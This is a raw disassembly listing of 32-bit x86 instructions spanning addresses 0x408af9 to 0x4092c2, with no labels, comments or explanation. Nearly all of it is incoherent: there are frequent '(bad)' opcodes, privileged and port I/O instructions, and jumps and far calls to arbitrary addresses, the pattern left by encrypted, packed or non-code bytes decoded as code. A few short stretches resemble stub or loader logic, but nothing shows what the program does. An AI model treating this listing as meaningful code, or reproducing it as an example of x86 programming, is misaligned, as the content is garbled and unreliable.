  408af9:	int    0x1a
  408afb:	lock lock add esp,esp
  408aff:	test   al,0x5
  408b01:	ins    DWORD PTR es:[edi],dx
  408b02:	xor    edi,DWORD PTR [ecx-0x31]
  408b05:	push   edx
  408b06:	push   0x9351962d
  408b0b:	push   eax
  408b0c:	sbb    al,0xea
  408b0e:	jl     0x408b13
  408b10:	sbb    esp,DWORD PTR ds:0x10577974
  408b16:	je     0x408b1f
  408b18:	push   0x33
  408b1a:	inc    ebx
  408b1b:	pop    ds
  408b1c:	shr    DWORD PTR [ebp+0x68e5aa57],1
  408b22:	mov    dl,BYTE PTR [esi+ecx*4]
  408b25:	add    al,0x4d
  408b27:	nop
  408b28:	out    dx,eax
  408b29:	push   cs
  408b2a:	inc    esp
  408b2b:	addr16 fwait
  408b2d:	dec    esp
  408b2e:	mov    BYTE PTR [ebp+0x4e],cl
  408b31:	(bad)  
  408b32:	loopne 0x408af3
  408b34:	mov    dh,0x82
  408b36:	mov    ah,0x1d
  408b38:	rcl    DWORD PTR [edx],1
  408b3a:	loop   0x408ade
  408b3c:	jb     0x408b24
  408b3e:	and    al,BYTE PTR [ebp-0x7c]
  408b41:	retf   
  408b42:	sub    al,0xf6
  408b44:	stos   DWORD PTR es:[edi],eax
  408b45:	and    DWORD PTR [esi+esi*4-0x35],ebp
  408b49:	or     al,0xc
  408b4b:	outs   dx,BYTE PTR ds:[esi]
  408b4c:	fwait
  408b4d:	xor    ebx,edx
  408b4f:	mov    esp,0x4df31ff
  408b54:	ret    0x961e
  408b57:	ins    DWORD PTR es:[edi],dx
  408b58:	adc    al,0x72
  408b5a:	ficomp WORD PTR [ecx-0x69]
  408b5d:	fldcw  WORD PTR [ecx-0x73]
  408b60:	or     eax,0x4474554a
  408b65:	sub    bh,BYTE PTR [edi]
  408b67:	push   esi
  408b68:	sub    DWORD PTR [eax-0x1e],esp
  408b6b:	sbb    al,0x79
  408b6d:	mov    dl,0x40
  408b6f:	inc    eax
  408b70:	stc    
  408b71:	adc    eax,0x2b35a7b7
  408b76:	mov    bl,0x24
  408b78:	into   
  408b79:	xchg   ebx,eax
  408b7a:	xor    eax,0x22a30eaa
  408b7f:	les    ecx,FWORD PTR [esp+eiz*8]
  408b82:	or     esi,0xffffffa4
  408b85:	mov    ch,0x15
  408b87:	inc    edx
  408b88:	adc    al,0xce
  408b8a:	push   edx
  408b8b:	packssdw mm5,QWORD PTR [esi+esi*2+0x7b02c988]
  408b93:	pop    ebx
  408b94:	push   0x67
  408b96:	icebp  
  408b97:	fnsave [eax-0x34]
  408b9a:	push   ecx
  408b9b:	idiv   BYTE PTR [esi-0x11291bf1]
  408ba1:	sub    eax,0x1e6a5510
  408ba6:	je     0x408b73
  408ba8:	test   BYTE PTR [edi+0x39],dh
  408bab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408bac:	add    cl,ah
  408bae:	jg     0x408b91
  408bb0:	aaa    
  408bb1:	adc    edi,DWORD PTR [eax]
  408bb3:	popf   
  408bb4:	jno    0x408ba1
  408bb6:	pop    ebp
  408bb7:	ret    0xc48c
  408bba:	dec    ebx
  408bbb:	and    BYTE PTR [edi+0x68],al
  408bbe:	dec    ebp
  408bbf:	jecxz  0x408b72
  408bc1:	jno    0x408b96
  408bc3:	(bad)  
  408bc4:	jae    0x408bd3
  408bc6:	loope  0x408c46
  408bc8:	mov    ds:0x7d323a64,al
  408bcd:	sub    al,0xaa
  408bcf:	cs pop ds
  408bd1:	neg    BYTE PTR es:[ebx-0x49]
  408bd5:	lea    esi,[edi-0x53678d41]
  408bdb:	mov    DWORD PTR [ebx+0x42c7499e],esi
  408be1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408be2:	sub    dh,BYTE PTR [edx-0x5c]
  408be5:	mov    bl,0x37
  408be7:	aad    0xf0
  408be9:	cwde   
  408bea:	mul    DWORD PTR [ecx]
  408bec:	sub    eax,0x4395e933
  408bf1:	cs data16 and al,0xa7
  408bf5:	dec    esi
  408bf6:	call   0x41c3ae6a
  408bfb:	jbe    0x408b87
  408bfd:	iret   
  408bfe:	shl    BYTE PTR [edx+0x59],1
  408c01:	mov    dl,0x50
  408c03:	sbb    eax,ebx
  408c05:	add    eax,0xf986aab1
  408c0a:	aad    0xa1
  408c0c:	and    DWORD PTR [edi],ebx
  408c0e:	push   ecx
  408c0f:	aas    
  408c10:	int3   
  408c11:	jnp    0x408bcb
  408c13:	rol    BYTE PTR [esi+0x47938965],0xc6
  408c1a:	in     eax,0xfd
  408c1c:	push   ebp
  408c1d:	add    DWORD PTR [ecx],edx
  408c1f:	xchg   ecx,eax
  408c20:	sub    edi,DWORD PTR [eax]
  408c22:	test   eax,0x764b5562
  408c27:	(bad)  
  408c28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c29:	cmc    
  408c2a:	push   es
  408c2b:	jbe    0x408c3a
  408c2d:	pop    eax
  408c2e:	or     DWORD PTR ds:0x2fa5c74a,edi
  408c34:	aam    0xfe
  408c36:	jmp    0x8b6e40de
  408c3b:	retf   0x6d40
  408c3e:	xlat   BYTE PTR ds:[ebx]
  408c3f:	or     al,BYTE PTR [ebx+0x2374ad9a]
  408c45:	mov    eax,0x87495919
  408c4a:	sar    esi,1
  408c4c:	or     bh,bh
  408c4e:	jne    0x408c40
  408c50:	mov    eax,ds:0x41b264
  408c55:	mov    eax,DWORD PTR [eax]
  408c57:	push   DWORD PTR [eax]
  408c59:	lea    eax,ds:0x41b280
  408c5f:	jmp    0x408fac
  408c64:	mov    ebx,0x93838448
  408c69:	push   ebx
  408c6a:	mov    ebx,0x78da0248
  408c6f:	(bad)  
  408c70:	ficom  WORD PTR [ecx+0xb]
  408c73:	test   DWORD PTR [edi-0x27],eax
  408c76:	jo     0x408ce8
  408c78:	and    BYTE PTR [ebp+0x70],bh
  408c7b:	jo     0x408c29
  408c7d:	or     bl,0x9c
  408c80:	out    dx,eax
  408c81:	inc    edx
  408c82:	push   eax
  408c83:	inc    esp
  408c84:	lods   eax,DWORD PTR ds:[esi]
  408c85:	xor    eax,edx
  408c87:	(bad)  
  408c88:	xor    ah,ch
  408c8a:	cmp    esi,eax
  408c8c:	jns    0x408cc2
  408c8e:	xchg   esp,eax
  408c8f:	sar    DWORD PTR [eax],cl
  408c91:	es aas 
  408c93:	fsub   QWORD PTR [esi+0x37a08012]
  408c99:	aaa    
  408c9a:	sub    al,0xf
  408c9c:	push   esp
  408c9d:	scas   eax,DWORD PTR es:[edi]
  408c9e:	aam    0xf9
  408ca0:	arpl   bp,di
  408ca2:	push   esp
  408ca3:	mov    cl,0x3f
  408ca5:	and    al,BYTE PTR [esi]
  408ca7:	ja     0x408c61
  408ca9:	and    BYTE PTR [ecx+0x70],ch
  408cac:	push   eax
  408cad:	(bad)  
  408cae:	fucompp 
  408cb0:	loope  0x408cb1
  408cb2:	and    eax,0x8c3e24c7
  408cb7:	test   al,0x4a
  408cb9:	fcom   DWORD PTR [ebp-0x32]
  408cbc:	jp     0x408d10
  408cbe:	mov    DWORD PTR [ebp+0x793a4a5f],esp
  408cc4:	test   DWORD PTR [edx+edi*2+0x558fdde5],ecx
  408ccb:	xchg   esp,eax
  408ccc:	clc    
  408ccd:	dec    ecx
  408cce:	gs sbb eax,eax
  408cd1:	xchg   esp,eax
  408cd2:	stc    
  408cd3:	sar    BYTE PTR [ebx],0xe1
  408cd6:	sbb    esi,DWORD PTR [eax+0x3b673ecf]
  408cdc:	stos   DWORD PTR es:[edi],eax
  408cdd:	dec    esp
  408cde:	add    bl,BYTE PTR [ebp+0x2bbcdb5b]
  408ce4:	(bad)  
  408ce6:	inc    eax
  408ce7:	js     0x408c81
  408ce9:	mov    eax,0xf752d6a0
  408cee:	sub    ebp,ecx
  408cf0:	sar    DWORD PTR [eax+0x3991753c],cl
  408cf6:	sbb    edx,esi
  408cf8:	and    BYTE PTR [ebx+ecx*2+0x4],dh
  408cfc:	and    DWORD PTR [ebx+0x75],ecx
  408cff:	jb     0x408c8f
  408d01:	shl    DWORD PTR [ebx+0x71],cl
  408d04:	rcl    BYTE PTR [edi+0x19e1ee00],cl
  408d0a:	or     BYTE PTR [eax-0x26b104d],bl
  408d10:	jp     0x408cda
  408d12:	inc    ebx
  408d13:	and    eax,DWORD PTR [ecx-0x3709bb25]
  408d19:	xchg   esp,eax
  408d1a:	adc    DWORD PTR [edx+0x32],ecx
  408d1d:	or     cl,BYTE PTR [edx+esi*2]
  408d20:	or     al,0x69
  408d22:	dec    esi
  408d23:	xchg   esi,eax
  408d24:	dec    esp
  408d25:	pop    es
  408d26:	sbb    DWORD PTR [edx+0x7a7a9476],esi
  408d2c:	(bad)  
  408d2d:	push   0x3
  408d2f:	xchg   DWORD PTR [ebx-0x56],ecx
  408d32:	retf   
  408d33:	mov    dh,0x51
  408d35:	test   al,0x14
  408d37:	mov    esp,0x913e69f4
  408d3c:	cmp    ch,BYTE PTR [ebx+0x4d356b89]
  408d42:	mov    DWORD PTR [ebx-0x52178420],esi
  408d48:	fcom   DWORD PTR [eax]
  408d4a:	sbb    BYTE PTR [ebp+0xbd65d55],al
  408d50:	mov    ds:0x2c64eb61,al
  408d55:	xlat   BYTE PTR ds:[ebx]
  408d56:	imul   edi,edi,0xb732e344
  408d5c:	mov    DWORD PTR [edi],ecx
  408d5e:	fld    TBYTE PTR [edx-0x1d]
  408d61:	sub    al,0x79
  408d63:	leave  
  408d64:	std    
  408d65:	xlat   BYTE PTR ds:[ebx]
  408d66:	push   0xc6657e79
  408d6b:	dec    ebp
  408d6c:	test   eax,0x2e2b12b5
  408d71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d72:	push   cs
  408d73:	mov    al,ds:0xbd319373
  408d78:	ins    DWORD PTR es:[edi],dx
  408d79:	ror    eax,1
  408d7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d7c:	adc    eax,0xc987a0cc
  408d81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d82:	das    
  408d83:	repnz arpl WORD PTR [eax+ebx*4+0x19],sp
  408d88:	call   0x2ef:0xa539f256
  408d8f:	popf   
  408d90:	sub    al,0xee
  408d92:	mov    ecx,0xeefb9876
  408d97:	jecxz  0x408dd5
  408d99:	and    al,0xca
  408d9b:	lahf   
  408d9c:	mov    bh,0xd2
  408d9e:	dec    ebp
  408d9f:	push   ss
  408da0:	sbb    dl,ch
  408da2:	mov    al,ds:0xeea412cc
  408da7:	sub    ebx,edi
  408da9:	inc    edi
  408daa:	mov    al,bl
  408dac:	sbb    bh,ah
  408dae:	(bad)  
  408daf:	fdiv   DWORD PTR [ecx]
  408db1:	mov    edi,0x309db737
  408db6:	lock out 0x23,al
  408db9:	mul    DWORD PTR [eax+0x71fd0896]
  408dbf:	sbb    ch,BYTE PTR [edi+0x38]
  408dc2:	into   
  408dc3:	push   ss
  408dc4:	stos   DWORD PTR es:[edi],eax
  408dc5:	ficomp DWORD PTR [esi+esi*8+0x6f]
  408dc9:	jp     0x408daf
  408dcb:	mov    ebx,0x9d1e3bee
  408dd0:	daa    
  408dd1:	jecxz  0x408e2a
  408dd3:	rcr    bh,0xd8
  408dd6:	popf   
  408dd7:	in     al,0x9d
  408dd9:	aaa    
  408dda:	sbb    BYTE PTR [ebp-0x17d1077a],dl
  408de0:	fistp  WORD PTR [edx+0x5462c95d]
  408de6:	ds dec ebp
  408de8:	call   0x240720b
  408ded:	sbb    ecx,esp
  408def:	adc    eax,0xa3711b01
  408df4:	fdivr  QWORD PTR [edx]
  408df6:	test   DWORD PTR ds:0xbb81bf8f,edi
  408dfc:	add    eax,DWORD PTR [ecx+0x55974c7]
  408e02:	xor    cl,bl
  408e04:	inc    DWORD PTR [eax+0x62]
  408e07:	xchg   al,ch
  408e09:	pop    ss
  408e0a:	add    eax,0x64b2260b
  408e0f:	xchg   esp,eax
  408e10:	out    dx,al
  408e11:	fadd   DWORD PTR [eax]
  408e13:	inc    esi
  408e14:	dec    edi
  408e15:	or     bl,BYTE PTR [edx+0x1b]
  408e18:	jle    0x408dfa
  408e1a:	test   BYTE PTR [ecx+eiz*8-0x1a2b64a],dl
  408e21:	das    
  408e22:	mov    al,ds:0x13596c6f
  408e27:	je     0x408deb
  408e29:	adc    esp,DWORD PTR [edi-0x402f180a]
  408e2f:	js     0x408e52
  408e31:	(bad)  
  408e32:	ud2    
  408e34:	jmp    0x76cfc422
  408e39:	into   
  408e3a:	pop    ebx
  408e3b:	inc    ecx
  408e3c:	fld    QWORD PTR [ebx+edx*4-0x2b87c0f0]
  408e43:	cld    
  408e44:	(bad)  
  408e45:	dec    BYTE PTR [eax+0x192ecc5f]
  408e4b:	xchg   edi,eax
  408e4c:	add    BYTE PTR [ecx-0x4fa516ee],0x1c
  408e53:	mov    bh,0x4d
  408e55:	mov    dl,0xd3
  408e57:	inc    ecx
  408e58:	je     0x408e4f
  408e5a:	or     ch,ah
  408e5c:	movntq (bad),mm6
  408e5d:	out    0xf5,eax
  408e5f:	ds sub ch,ch
  408e62:	(bad)  
  408e63:	push   cs
  408e64:	lods   al,BYTE PTR cs:[esi]
  408e66:	push   ss
  408e67:	mov    ah,0x7
  408e69:	mov    bl,BYTE PTR [ecx]
  408e6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e6c:	mov    edx,0x70bb2e93
  408e71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e72:	fisub  WORD PTR [ecx]
  408e74:	das    
  408e75:	ja     0x408e27
  408e77:	jae    0x408e6c
  408e79:	popa   
  408e7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e7b:	xlat   BYTE PTR ds:[ebx]
  408e7c:	sbb    cl,cl
  408e7e:	gs mov ?,ebx
  408e81:	imul   edi,DWORD PTR [esi],0x87518930
  408e87:	mov    al,0xd8
  408e89:	je     0x408ebb
  408e8b:	add    al,0x74
  408e8d:	stos   DWORD PTR es:[edi],eax
  408e8e:	push   ebp
  408e8f:	out    dx,eax
  408e90:	ret    0xeaca
  408e93:	push   ecx
  408e94:	push   ebx
  408e95:	test   al,0xae
  408e97:	mov    ch,0xf3
  408e99:	dec    ebx
  408e9a:	rol    ah,0x53
  408e9d:	sub    dl,BYTE PTR [edi+0xd]
  408ea0:	jmp    0x38f49ad
  408ea5:	in     eax,dx
  408ea6:	push   ecx
  408ea7:	out    dx,al
  408ea8:	pop    edx
  408ea9:	push   0x23c65242
  408eae:	dec    edi
  408eaf:	shl    BYTE PTR [edi+0x5f1f2f1f],1
  408eb5:	(bad)  
  408eb7:	sbb    BYTE PTR [edi],ah
  408eb9:	xchg   esi,eax
  408eba:	in     al,0x4f
  408ebc:	mov    edi,cr3
  408ebf:	xchg   BYTE PTR [ecx+0x59910b2c],dh
  408ec5:	xchg   BYTE PTR [eax],bh
  408ec7:	xchg   BYTE PTR [edx-0x13c45408],ch
  408ecd:	ja     0x408ef3
  408ecf:	push   eax
  408ed0:	jae    0x408ef2
  408ed2:	ja     0x408f1d
  408ed4:	mov    ah,BYTE PTR [ebx]
  408ed6:	push   es
  408ed7:	test   DWORD PTR [eax],ebx
  408ed9:	or     ah,dl
  408edb:	pop    edi
  408edc:	bound  esp,QWORD PTR [edx-0x3d715573]
  408ee2:	or     ebx,ebx
  408ee4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ee5:	pop    edi
  408ee6:	add    DWORD PTR [esi],esp
  408ee8:	cmc    
  408ee9:	dec    ebp
  408eea:	and    ebx,edx
  408eec:	inc    ecx
  408eed:	mov    esi,0x5c837ece
  408ef2:	dec    edi
  408ef3:	pop    ebp
  408ef4:	ret    0x26d1
  408ef7:	xchg   edi,ecx
  408ef9:	mov    ebp,0xfb9d282
  408efe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f00:	push   ebx
  408f01:	sbb    edi,DWORD PTR [esi-0x59]
  408f04:	or     esi,DWORD PTR [esi-0x73d32a04]
  408f0a:	loop   0x408f4b
  408f0c:	add    eax,0x7f1e024
  408f11:	xor    al,0x8b
  408f13:	std    
  408f14:	mov    eax,0xd8a5c016
  408f19:	cmp    bl,bh
  408f1b:	sub    BYTE PTR [esi-0x207e52fb],al
  408f21:	ror    edi,0xa9
  408f24:	inc    eax
  408f25:	loop   0x408f24
  408f27:	fstp   DWORD PTR [ebx]
  408f29:	shl    cl,0xf7
  408f2c:	cwde   
  408f2d:	add    BYTE PTR fs:[ecx],dl
  408f30:	mov    eax,ds:0x62740ea3
  408f35:	retf   
  408f36:	pop    esi
  408f37:	jmp    0x95ea1ac9
  408f3c:	aam    0x78
  408f3e:	mov    esp,0x7b8e5c8c
  408f43:	aad    0x7d
  408f45:	out    dx,al
  408f46:	mov    DWORD PTR [ecx-0x42fc843c],0xec91279c
  408f50:	sbb    DWORD PTR [edi+eiz*2-0x15],0xaebe5a51
  408f58:	push   0xffffff87
  408f5a:	mov    eax,es:0x9446a9d3
  408f60:	in     al,dx
  408f61:	dec    esi
  408f62:	lods   al,BYTE PTR ds:[esi]
  408f63:	and    ebx,DWORD PTR [esi+0x3]
  408f66:	jg     0x408fb3
  408f68:	adc    DWORD PTR [ecx],eax
  408f6a:	jne    0x408fbc
  408f6c:	sub    dl,BYTE PTR [edx+0x16]
  408f6f:	ins    DWORD PTR es:[edi],dx
  408f70:	xor    eax,0x99f52f14
  408f75:	sbb    BYTE PTR [ebp-0x54f2b823],dl
  408f7b:	add    bh,BYTE PTR [ecx+0x764a45e0]
  408f81:	call   0x49b28ee4
  408f86:	cmp    ebx,ecx
  408f88:	mov    edx,0x91aea97
  408f8d:	sub    al,dh
  408f8f:	icebp  
  408f90:	lahf   
  408f91:	out    dx,al
  408f92:	adc    dh,BYTE PTR [esi+ecx*1+0xb3aa55b]
  408f99:	clc    
  408f9a:	adc    eax,0x5bcfaf3a
  408f9f:	jp     0x408f8c
  408fa1:	out    dx,al
  408fa2:	pusha  
  408fa3:	or     ax,0x43e8
  408fa7:	dec    esi
  408fa8:	scas   eax,DWORD PTR es:[edi]
  408fa9:	adc    ebx,edi
  408fab:	int3   
  408fac:	push   DWORD PTR [eax]
  408fae:	lea    eax,ds:0x41b02c
  408fb4:	jmp    0x409301
  408fb9:	add    al,0x7c
  408fbb:	out    0xcb,eax
  408fbd:	out    0xf3,eax
  408fbf:	xor    al,0xd3
  408fc1:	call   0x181937f3
  408fc6:	dec    ebp
  408fc7:	dec    edi
  408fc8:	sub    al,0x77
  408fca:	out    0x70,al
  408fcc:	jo     0x408fee
  408fce:	jge    0x409040
  408fd0:	jo     0x40904a
  408fd2:	mov    DWORD PTR [ebp-0x13],esp
  408fd5:	popf   
  408fd6:	imul   edx,DWORD PTR [ecx-0xc],0xcc52798d
  408fdd:	ins    BYTE PTR es:[edi],dx
  408fde:	inc    esp
  408fdf:	mov    al,0x4e
  408fe1:	scas   al,BYTE PTR es:[edi]
  408fe2:	dec    ebx
  408fe3:	push   cs
  408fe4:	nop
  408fe5:	jmp    0x27e0207
  408fea:	cmp    BYTE PTR ds:0x2d0ce845,dh
  408ff0:	sub    DWORD PTR [ebp+0x7b78e7fa],ebp
  408ff6:	pop    esp
  408ff7:	jl     0x408fcb
  408ff9:	cwde   
  408ffa:	inc    ebp
  408ffb:	push   ss
  408ffc:	pop    ecx
  408ffd:	ja     0x408f8e
  408fff:	mov    dh,0xca
  409001:	xor    al,0xc9
  409003:	or     ch,BYTE PTR [edi+0x3d0a138e]
  409009:	dec    esp
  40900a:	inc    edx
  40900b:	dec    esp
  40900c:	ins    DWORD PTR es:[edi],dx
  40900d:	adc    ebx,DWORD PTR [esi]
  40900f:	call   0xa9b69121
  409014:	mov    WORD PTR [edi],ss
  409016:	xor    eax,0x6823d723
  40901b:	add    edx,ebp
  40901d:	inc    ecx
  40901e:	call   0x5a2c822e
  409023:	pop    esi
  409024:	test   DWORD PTR [eax],0xc2b96bf3
  40902a:	or     BYTE PTR [ebx-0x65],dl
  40902d:	mov    gs,WORD PTR [ecx-0x3e672c8b]
  409033:	ss test eax,ebx
  409036:	dec    esp
  409037:	ret    
  409038:	pushf  
  409039:	ret    0xc3fe
  40903c:	mov    cl,0x1b
  40903e:	or     DWORD PTR [esi-0x24],esp
  409041:	test   DWORD PTR [ebx+0x4dbf5eb2],esp
  409047:	arpl   WORD PTR [ebp-0xe],di
  40904a:	add    eax,0x42c2a187
  40904f:	dec    ebp
  409050:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409051:	das    
  409052:	jno    0x409098
  409054:	rcl    DWORD PTR [esi],cl
  409056:	adc    BYTE PTR [edx+0x7c87c6dd],cl
  40905c:	mov    edi,0x909c8f3c
  409061:	and    eax,0x36c9c99b
  409066:	sub    BYTE PTR [eax+0x5156f051],bh
  40906c:	mov    eax,ds:0xfe70aba0
  409071:	dec    ah
  409073:	pop    eax
  409074:	add    BYTE PTR [esi],dl
  409076:	out    dx,al
  409077:	sub    BYTE PTR ds:[eax-0x1799e20c],dl
  40907e:	int    0xf4
  409080:	adc    al,0xb5
  409082:	imul   edi,DWORD PTR [esi+0x3376becd],0x1f
  409089:	std    
  40908a:	mov    esi,0x233af623
  40908f:	jno    0x40903f
  409091:	ret    
  409092:	js     0x4090f8
  409094:	xor    edi,eax
  409096:	inc    ecx
  409097:	pop    edx
  409098:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409099:	lea    edx,[ebx]
  40909b:	out    0xb2,eax
  40909d:	call   0x3d80eb66
  4090a2:	clc    
  4090a3:	push   edi
  4090a4:	cmp    eax,0x611950da
  4090a9:	push   esp
  4090aa:	sub    DWORD PTR [ebp+eax*1-0x2d],ebp
  4090ae:	int    0x48
  4090b0:	push   ebx
  4090b1:	call   0x2b4c2d34
  4090b6:	dec    ebx
  4090b7:	lods   al,BYTE PTR ds:[esi]
  4090b8:	ins    BYTE PTR es:[edi],dx
  4090b9:	or     dl,BYTE PTR ds:0xbafe4601
  4090bf:	ret    0xf994
  4090c2:	or     eax,0x85b6e05b
  4090c7:	das    
  4090c8:	dec    esi
  4090c9:	int    0x33
  4090cb:	test   BYTE PTR [ebx],0xa3
  4090ce:	loop   0x409139
  4090d0:	pusha  
  4090d1:	inc    ecx
  4090d2:	xor    DWORD PTR [edx+0x45],edx
  4090d5:	push   ecx
  4090d6:	jp     0x333f1046
  4090dc:	retf   
  4090dd:	jge    0x40914f
  4090df:	xor    esi,DWORD PTR [ebx+edi*8]
  4090e2:	jmp    0xc8bb:0x1a6feab4
  4090e9:	xchg   ebp,eax
  4090ea:	call   0x1e80:0x630218dd
  4090f1:	or     cl,dh
  4090f3:	sub    eax,0x5bd215a0
  4090f8:	mov    bl,0xd9
  4090fa:	ss xor al,0x6a
  4090fd:	aad    0xce
  4090ff:	ins    BYTE PTR es:[edi],dx
  409100:	push   eax
  409101:	sub    DWORD PTR [eax],0x609c3b87
  409107:	lods   al,BYTE PTR ds:[esi]
  409108:	mov    esi,DWORD PTR [ebx+0x76]
  40910b:	or     BYTE PTR [esi-0x54dc38f7],bl
  409111:	pop    esi
  409112:	add    ebp,DWORD PTR [edx+ebx*2-0x58f18458]
  409119:	and    ebx,DWORD PTR [ebp-0x1c]
  40911c:	daa    
  40911d:	dec    BYTE PTR [edi+ebp*2+0x508b253d]
  409124:	lahf   
  409125:	jmp    0x4090c5
  409127:	(bad)  
  409128:	cwde   
  409129:	mov    dh,0x3a
  40912b:	dec    eax
  40912c:	mov    al,ds:0x6497a4ca
  409131:	mov    es,WORD PTR [ecx]
  409133:	push   ebp
  409135:	cld    
  409136:	jle    0x409126
  409138:	jae    0x4090f0
  40913a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40913b:	inc    ebp
  40913c:	loope  0x40916a
  40913e:	dec    ebp
  40913f:	sbb    DWORD PTR [ecx-0x68],0xa6b9bd13
  409146:	xchg   BYTE PTR [edi],dl
  409148:	fucomp st(5)
  40914a:	add    eax,0xeb7c269f
  40914f:	rcr    ebx,0xd8
  409152:	pushf  
  409153:	jnp    0x409182
  409155:	jmp    0xc7e5e4fe
  40915a:	loopne 0x4091be
  40915c:	cld    
  40915d:	xlat   BYTE PTR ds:[ebx]
  40915e:	mov    al,0xc0
  409160:	mov    cl,0x55
  409162:	sbb    eax,0xcb03f7e1
  409167:	ins    BYTE PTR es:[edi],dx
  409168:	mov    esp,0xa9267b5d
  40916d:	das    
  40916e:	ds push 0xdc226991
  409174:	jmp    0xe70f:0x8420b70c
  40917b:	gs mov edi,0xa851cfbd
  409181:	je     0x409118
  409183:	mov    eax,ds:0xabec4984
  409188:	mov    DWORD PTR [ebx+0x5b],ebp
  40918b:	popf   
  40918c:	lahf   
  40918d:	and    esi,edx
  40918f:	loopne 0x40912a
  409191:	cmp    cl,BYTE PTR [edx]
  409193:	adc    dl,BYTE PTR [ecx+eax*4+0x5b]
  409197:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409198:	jbe    0x4091ef
  40919a:	repnz into 
  40919c:	xor    ebx,DWORD PTR [ebp-0x444653e9]
  4091a2:	mov    ?,WORD PTR [ebp-0x3c0e4095]
  4091a8:	mul    BYTE PTR [edx-0x2e0fc869]
  4091ae:	cwde   
  4091af:	jo     0x4091cc
  4091b1:	stos   DWORD PTR es:[edi],eax
  4091b2:	pop    esp
  4091b3:	jl     0x4091b7
  4091b5:	loop   0x4091f0
  4091b7:	pop    ds
  4091b8:	jmp    0x90ac:0x9b837103
  4091bf:	xchg   edi,eax
  4091c0:	scas   al,BYTE PTR es:[edi]
  4091c1:	mov    dl,0xc1
  4091c3:	push   ecx
  4091c4:	xchg   edx,eax
  4091c5:	mov    edi,0xd53ff201
  4091ca:	shl    ebp,0xe6
  4091cd:	inc    ebx
  4091ce:	mov    dl,0xf6
  4091d0:	outs   dx,DWORD PTR ds:[esi]
  4091d1:	xchg   ebp,eax
  4091d2:	jmp    0x4091c6
  4091d4:	sub    ecx,DWORD PTR [ecx+0x3160cf41]
  4091da:	pop    ebx
  4091db:	sbb    dl,dl
  4091dd:	jnp    0x409254
  4091df:	ficom  DWORD PTR [ebp-0x16c3a92d]
  4091e5:	fwait
  4091e6:	mov    dh,0x68
  4091e8:	lods   eax,DWORD PTR ds:[esi]
  4091e9:	jecxz  0x409264
  4091eb:	in     al,0x2f
  4091ed:	adc    eax,0x5ac67fbe
  4091f2:	popf   
  4091f3:	xlat   BYTE PTR ds:[ebx]
  4091f4:	es pop eax
  4091f6:	jb     0x40921f
  4091f8:	adc    edx,DWORD PTR [eax]
  4091fa:	jg     0x40926e
  4091fc:	ja     0x4091a9
  4091fe:	mov    cl,0xc1
  409200:	xor    bh,0x62
  409203:	sahf   
  409204:	cmp    ebx,DWORD PTR [esp+ebp*8]
  409207:	ins    DWORD PTR es:[edi],dx
  409208:	inc    edi
  409209:	pop    es
  40920a:	push   es
  40920b:	pop    ss
  40920c:	cmp    al,BYTE PTR [ebp-0x63]
  40920f:	mov    eax,0x6897dbdc
  409214:	add    DWORD PTR [ecx+0x2],0x68
  409218:	leave  
  409219:	adc    ebp,0xc0331e64
  40921f:	popf   
  409220:	iret   
  409221:	clc    
  409222:	jge    0x409225
  409224:	inc    edi
  409225:	xchg   ebp,eax
  409226:	sti    
  409227:	and    al,0x63
  409229:	scas   al,BYTE PTR es:[edi]
  40922a:	rol    DWORD PTR [esi-0x5b],cl
  40922d:	push   ds
  40922e:	test   BYTE PTR [esi-0x3193bf21],bl
  409234:	rcl    DWORD PTR [esi],cl
  409236:	inc    ecx
  409237:	mov    al,ds:0x3d5584d0
  40923c:	stc    
  40923d:	xchg   esp,eax
  40923e:	sti    
  40923f:	lds    eax,FWORD PTR [edx-0x596ae43f]
  409245:	retf   0xb4b8
  409248:	mov    al,0x48
  40924a:	hlt    
  40924b:	scas   eax,DWORD PTR es:[edi]
  40924c:	mov    bh,0x56
  40924e:	xor    edi,ebx
  409250:	jmp    0x409235
  409252:	out    dx,al
  409253:	loope  0x409212
  409255:	mov    ebx,0x4fe388e7
  40925a:	mov    ah,0x3e
  40925c:	ficom  DWORD PTR [ecx]
  40925e:	mov    ebx,DWORD PTR [ecx+ecx*1]
  409261:	cld    
  409262:	jne    0x409272
  409264:	push   ecx
  409265:	pop    es
  409266:	mov    esp,0x2b1a2917
  40926b:	or     DWORD PTR [eax],ecx
  40926d:	in     al,0x44
  40926f:	fwait
  409270:	aam    0x19
  409272:	add    esp,DWORD PTR [eax-0x1c]
  409275:	sbb    eax,0x26714f8
  40927a:	retf   
  40927b:	adc    eax,0xad76e92f
  409280:	popa   
  409281:	inc    edi
  409282:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409283:	cmp    BYTE PTR [esi],al
  409285:	enter  0x6252,0x5b
  409289:	inc    esi
  40928a:	cmp    BYTE PTR [edx+0x29da2dc7],cl
  409290:	call   0xf3f5:0x91c03807
  409297:	ins    DWORD PTR es:[edi],dx
  409298:	mov    DWORD PTR [eax-0x34],ebx
  40929b:	shl    bl,0xb3
  40929e:	xor    cl,ch
  4092a0:	add    ecx,DWORD PTR [edi+0x75]
  4092a3:	and    dl,BYTE PTR [edx-0x18]
  4092a6:	mov    bl,0xc
  4092a8:	xor    dh,dl
  4092aa:	imul   BYTE PTR [ebx+esi*8-0x10]
  4092ae:	lahf   
  4092af:	outs   dx,DWORD PTR ds:[esi]
  4092b0:	bound  edi,QWORD PTR [ebp+0x43]
  4092b3:	mul    BYTE PTR [esi-0x65]
  4092b6:	out    0x54,al
  4092b8:	fucom  st(7)
  4092ba:	sbb    ecx,DWORD PTR [ecx-0x29a7bc52]
  4092c0:	out    0xd8,eax
  4092c2:	bound  eax,QWORD PTR [esi-0x48bfd058]
